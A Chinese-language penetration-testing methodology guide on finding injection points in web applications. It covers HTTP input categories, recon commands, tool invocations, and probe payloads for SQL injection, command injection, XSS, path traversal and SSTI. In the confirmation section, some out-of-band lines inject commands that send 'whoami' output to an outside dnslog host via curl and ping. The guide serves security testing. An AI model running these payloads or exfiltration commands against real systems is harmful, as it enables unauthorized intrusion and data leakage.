# 注入点检测框架方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供系统化的注入点检测框架，帮助在渗透测试初期快速、全面地识别所有潜在的注入点，确保测试覆盖的完整性。

## 1.2 适用范围
适用于所有类型的注入漏洞检测，包括 SQL 注入、NoSQL 注入、命令注入、XXE、SSTI 等。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：注入点系统化检测

### 2.1 技术介绍

注入点检测是渗透测试的第一步，目标是识别应用中所有可能存在注入漏洞的输入点。本框架提供系统化的方法，确保不遗漏任何潜在的注入点。

### 2.2 输入点分类

#### 2.2.1 HTTP 请求输入点

| 类别 | 位置 | 示例 |
|-----|------|------|
| **URL 参数** | 查询字符串 | `?id=1&name=test` |
| **POST 表单** | 请求体 | `username=admin&password=123` |
| **JSON 请求体** | 请求体 | `{"username": "admin"}` |
| **XML 请求体** | 请求体 | `<user><name>admin</name></user>` |
| **文件上传** | multipart/form-data | 文件名、文件内容 |

#### 2.2.2 HTTP 头输入点

| 类别 | 头名称 | 说明 |
|-----|--------|------|
| **标准头** | User-Agent | 用户代理字符串 |
| **标准头** | Referer | 来源页面 URL |
| **标准头** | Cookie | Cookie 值 |
| **标准头** | Accept-Language | 语言偏好 |
| **代理头** | X-Forwarded-For | 客户端 IP |
| **代理头** | X-Real-IP | 真实 IP |
| **自定义头** | X-User-Id | 用户 ID |
| **自定义头** | X-API-Key | API 密钥 |

#### 2.2.3 其他输入点

| 类别 | 位置 | 示例 |
|-----|------|------|
| **WebSocket** | 消息内容 | `{"action": "query", "data": "input"}` |
| **GraphQL** | 查询参数 | `query { user(id: "input") }` |
| **SOAP** | XML 消息 | `<userId>input</userId>` |
| **文件内容** | 上传的文件 | 图片 EXIF、文档元数据 |

### 2.3 检测流程

#### 2.3.1 信息收集阶段

**步骤 1：爬虫抓取**
```bash
# 使用工具爬取所有可达页面
gobuster dir -u http://target -w common.txt
dirb http://target
ffuf -u http://target/FUZZ -w wordlist.txt

# 浏览器爬取
- 手动浏览所有功能
- 记录所有表单和参数
- 使用浏览器开发工具监控请求
```

**步骤 2：代理抓包**
```
# 配置 Burp Suite/ZAP
1. 配置浏览器代理到 Burp Suite
2. 浏览应用所有功能
3. 记录所有请求和参数
4. 分析参数类型和用途
```

**步骤 3：API 文档分析**
```
# 查找 API 文档
/swagger.json
/openapi.yaml
/api-docs
/graphql  # GraphQL Schema
?wsdl  # SOAP WSDL

# 分析 API 端点和参数
```

#### 2.3.2 输入点枚举阶段

**参数识别清单：**

```
# 数值型参数
id, page, limit, offset, sort, order, count, total

# 字符串型参数
name, username, email, search, query, keyword, filter

# 路径参数
/user/{id}, /post/{slug}, /file/{filename}

# 布尔型参数
active, enabled, verified, admin

# 日期参数
date, from, to, start, end, created_at

# 文件参数
file, filename, path, dir, folder, document

# 认证参数
token, session, cookie, auth, api_key
```

#### 2.3.3 初步探测阶段

**通用探测 Payload：**

```
# 特殊字符测试
' " ` < > \ / ; : & | * ? ~ ! @ # $ % ^ ( ) [ ] { } , . + =

# SQL 注入探测
' OR '1'='1
" OR "1"="1
'; WAITFOR DELAY '0:0:5'--
1' AND 1=1--
1' AND 1=2--

# 命令注入探测
;id
|id
`id`
$(id)
;sleep 5

# XSS 探测
<script>alert(1)</script>
"><script>alert(1)</script>

# 路径遍历探测
../
..//
..%2f..%2f
%2e%2e%2f

# SSTI 探测
${7*7}
{{7*7}}
#{7*7}
```

**响应分析：**

| 响应特征 | 可能漏洞 | 后续操作 |
|---------|---------|---------|
| SQL 错误信息 | SQL 注入 | 深入 SQL 注入测试 |
| 命令执行结果 | 命令注入 | 深入命令注入测试 |
| 页面内容变化 | 注入成功 | 分析差异确定类型 |
| 响应时间延迟 | 时间盲注 | 确认延迟注入 |
| XSS 弹窗 | XSS | 深入 XSS 测试 |
| 文件内容返回 | 路径遍历 | 深入路径遍历测试 |

#### 2.3.4 漏洞确认阶段

**确认方法：**

```
# 布尔盲注确认
真条件：id=1 AND 1=1
假条件：id=1 AND 1=2
观察响应差异

# 时间盲注确认
正常：id=1
延迟：id=1; WAITFOR DELAY '0:0:5'--
观察响应时间差异

# 带外确认
DNSLog: id=1; ping `whoami`.dnslog.com
HTTPLog: id=1; curl http://dnslog.com/$(whoami)
观察 DNS/HTTP 请求
```

### 2.4 自动化工具

#### 2.4.1 综合扫描工具

```bash
# SQLMap - SQL 注入
sqlmap -u "http://target/page?id=1" --batch

# XSStrike - XSS 检测
xsstrike -u "http://target/search?q=test"

# Nuclei - 多种漏洞
nuclei -u http://target -t exposures/

# Burp Suite Scanner
- 主动扫描
- 被动扫描
```

#### 2.4.2 参数发现工具

```bash
# Arjun - 参数发现
arjun -u http://target/page

# ParamMiner - Burp 插件
- 发现隐藏参数
- 发现参数值

# ffuf - fuzzing
ffuf -u http://target/page?FUZZ=value -w params.txt
```

### 2.5 检测清单

#### 2.5.1 输入点检测清单

- [ ] 所有 URL 查询参数
- [ ] 所有 POST 表单参数
- [ ] 所有 JSON 请求体字段
- [ ] 所有 XML 请求体字段
- [ ] 所有 HTTP 头
- [ ] 所有 Cookie 值
- [ ] 所有文件上传参数
- [ ] 所有 WebSocket 消息
- [ ] 所有 GraphQL 查询参数
- [ ] 所有 SOAP 消息字段

#### 2.5.2 探测 Payload 清单

- [ ] 特殊字符测试（所有常见特殊字符）
- [ ] SQL 注入探测（5+ 种 Payload）
- [ ] 命令注入探测（5+ 种 Payload）
- [ ] XSS 探测（3+ 种 Payload）
- [ ] 路径遍历探测（3+ 种 Payload）
- [ ] SSTI 探测（3+ 种 Payload）
- [ ] XXE 探测（2+ 种 Payload）

---

# 第三部分：附录

## 3.1 输入点检测脚本示例

```python
import requests
from urllib.parse import urlparse, parse_qs

def enumerate_params(url):
    """枚举 URL 参数"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys())

def test_injection(url, param, payload):
    """测试注入"""
    test_url = f"{url}&{param}={payload}"
    response = requests.get(test_url)
    return response.text, response.status_code, response.elapsed.total_seconds()
```

## 3.2 参考资源

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
